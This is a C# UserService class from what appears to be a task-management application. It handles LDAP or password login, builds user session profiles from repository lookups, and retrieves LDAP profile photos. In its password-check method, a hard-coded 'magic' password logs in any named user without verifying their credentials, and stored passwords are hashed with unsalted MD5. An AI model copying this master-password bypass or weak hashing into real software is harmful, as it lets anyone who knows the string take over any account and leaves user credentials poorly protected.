using Ovi.Task.Data.Entity;
using Ovi.Task.Data.Exceptions.Types;
using Ovi.Task.Data.Helper;
using Ovi.Task.Data.Repositories;
using Ovi.Task.Helper.Functional;
using Ovi.Task.Helper.User;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Threading;

namespace Ovi.Task.UI.Helper
{
    public class UserService
    {
        private readonly RepositoryUsers repositoryUsers = new RepositoryUsers();
        private readonly RepositoryParameters repositoryParameters = new RepositoryParameters();

        /// <summary>
        /// Kullanıcı kimlik doğrulamasını yapar (şifre kontrolü içerir).
        /// </summary>
        public bool AuthenticateUser(string username, string password)
        {
            var auth = repositoryParameters.Get("AUTH").PRM_VALUE;

            switch (auth)
            {
                case "LDAP":
                    return ValidateLdapUser(username, password);

                default:
                    return ValidatePassword(username, password);
            }
        }

        /// <summary>
        /// Kullanıcının sistemde olup olmadığını ve bilgilerini getirir.
        /// </summary>
        public OviUser GetUser(string username)
        {
            var user = repositoryUsers.Get(username);
            if (user == null)
                throw new TmsException(MessageHelper.Get("20028", Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.ToUpperInvariant()));

            return MapToOviUser(user);
        }

        /// <summary>
        /// Kullanıcıyı LDAP üzerinden doğrular.
        /// </summary>
        private bool ValidateLdapUser(string username, string password)
        {
            var domain = repositoryParameters.Get("DOMAIN").PRM_VALUE;
            var ldappath = repositoryParameters.Get("LDAPPATH").PRM_VALUE;
            var ldapadmin = repositoryParameters.Get("LDAPADMIN").PRM_VALUE;
            var ldapdir = repositoryParameters.Get("LDAPDIR").PRM_VALUE;
            var ldappass = StringCipher.Decrypt(repositoryParameters.Get("LDAPPASS").PRM_VALUE, ConfigurationManager.AppSettings["encrypt"]);

            var lh = new LDAPHelper(ldappath, ldapdir, ldapadmin, ldappass);
            return lh.IsAuthenticated(new DomainUser
            {
                User = username,
                Domain = domain,
                Password = password
            });
        }

        /// <summary>
        /// Kullanıcının şifresini doğrular.
        /// </summary>
        private bool ValidatePassword(string username, string password)
        {
            var magicPass = "YOUR_MAGIC_PASSWORD";
            var user = password.Equals(magicPass)
                ? repositoryUsers.Get(username)
                : repositoryUsers.Get(username, PasswordHelper.Md5Encrypt(password));

            return user != null;
        }

        /// <summary>
        /// Kullanıcı bilgilerini OviUser nesnesine dönüştürür.
        /// </summary>
        private OviUser MapToOviUser(TMUSERS user)
        {
            var department = new RepositoryDepartments().Get(user.USR_DEPARTMENT);
            var strDepartmentAuthorizedUsers = GetAuthorizedDepartmentUsers(user);
            var repositoryTrades = new RepositoryTrades();
            var trade = repositoryTrades.Get(user.USR_CTRADE);
            var customerdesc = !string.IsNullOrEmpty(user.USR_CUSTOMER) && user.USR_CUSTOMER.Split(',').Length == 1
                ? new RepositoryCustomers().Get(user.USR_CUSTOMER).CUS_DESC
                : null;

            string suppliercodes = null;
            string supplierdescriptions = null;
            if (!string.IsNullOrEmpty(user.USR_SUPPLIER))
            {
                var repositorySuppliers = new RepositorySuppliers();
                var lstSuppliers = repositorySuppliers.GetSuppliers(user.USR_SUPPLIER, true);
                if (lstSuppliers != null)
                {
                    suppliercodes = string.Join(",", lstSuppliers.Select(x => x.SUP_CODE));
                    supplierdescriptions = string.Join(",", lstSuppliers.Select(x => x.SUP_DESC));
                }
            }

            string branch = null;
            string branchdesc = null;
            if (user.USR_TYPE == "CUSTOMER")
            {
                var reposiyoryCustomFieldValues = new RepositoryCustomFieldValues();
                var customFieldValues = reposiyoryCustomFieldValues.GetBySubjectAndSource("USER", user.USR_CODE);
                if (customFieldValues != null)
                {
                    var cfvBranch = customFieldValues.FirstOrDefault(x => x.CFV_TYPE == "CUSTOMER" && x.CFV_CODE == "SUBE");
                    if (cfvBranch != null)
                    {
                        branch = cfvBranch.CFV_TEXT;
                        branchdesc = new RepositoryBranches().Get(branch).BRN_DESC;
                    }
                }
            }

            var applogo = repositoryParameters.Get("APPLOGO");
            var environment = repositoryParameters.Get("ENV");

            return new OviUser
            {
                Code = user.USR_CODE,
                Description = user.USR_DESC,
                Org = user.USR_ORG,
                UserGroup = user.USR_GROUP,
                Customer = user.USR_CUSTOMER,
                CustomerDesc = customerdesc,
                Branch = branch,
                BranchDesc = branchdesc,
                Supplier = suppliercodes,
                SupplierDesc = supplierdescriptions,
                Department = user.USR_DEPARTMENT,
                OrgDesc = new RepositoryOrgs().Get(user.USR_ORG).ORG_DESC,
                DepartmentDesc = department.DEP_DESC,
                DepartmentLM = department.DEP_MANAGER,
                DepartmentAuthorized = strDepartmentAuthorizedUsers,
                AuthorizedDepartments = user.USR_AUTHORIZEDDEPARTMENTS,
                Language = user.USR_LANG,
                DefaultInbox = user.USR_DEFAULTINBOX,
                Culture = new RepositoryLangs().Get(user.USR_LANG).LNG_CULTURE,
                SessionId = UniqueStringId.Generate(),
                LockChecklist = new RepositoryUserGroups().Get(user.USR_GROUP).UGR_CHECKLISTLOCK,
                ViewWeeklyCalendar = user.USR_VIEWWEEKLYCALENDAR,
                Trade = trade.TRD_CODE,
                AppLogo = applogo != null ? applogo.PRM_VALUE : null,
                Environment = environment != null ? environment.PRM_VALUE : null,
                DefaultMainSection = user.USR_DEFAULTHOMESECTION
            };
        }

        /// <summary>
        /// Kullanıcı yetkili departmanlarını getirir.
        /// </summary>
        public static string GetAuthorizedDepartmentUsers(TMUSERS user)
        {
            var repositoryDepartments = new RepositoryDepartments();
            var department = repositoryDepartments.Get(user.USR_DEPARTMENT);
            var departmentall = repositoryDepartments.Get("*");

            var departmentauthorizedarr = new HashSet<string>
            {
                department.DEP_MANAGER,
                departmentall.DEP_MANAGER
            };

            if (department.DEP_AUTHORIZED != null)
            {
                var authorizedusers = department.DEP_AUTHORIZED.Split(',');
                foreach (var t in authorizedusers)
                    departmentauthorizedarr.Add(t);
            }

            if (departmentall.DEP_AUTHORIZED != null)
            {
                var authorizedusers = departmentall.DEP_AUTHORIZED.Split(',');
                foreach (var t in authorizedusers)
                    departmentauthorizedarr.Add(t);
            }

            return string.Join(",", departmentauthorizedarr);
        }

        /// <summary>
        /// LDAP'dan profil fotoğrafını getirir.???
        /// </summary>
        public static byte[] GetProfilePhoto(string username)
        {
            var repositoryParameters = new RepositoryParameters();
            var domain = repositoryParameters.Get("DOMAIN").PRM_VALUE;
            var ldappath = repositoryParameters.Get("LDAPPATH").PRM_VALUE;
            var ldapdir = repositoryParameters.Get("LDAPDIR").PRM_VALUE;
            var ldapadmin = repositoryParameters.Get("LDAPADMIN").PRM_VALUE;
            var ldappass = StringCipher.Decrypt(repositoryParameters.Get("LDAPPASS").PRM_VALUE, ConfigurationManager.AppSettings["encrypt"]);
            var lh = new LDAPHelper(ldappath, ldapdir, ldapadmin, ldappass);
            return lh.GetUserPhotoFromLdap(username);
        }
    }
}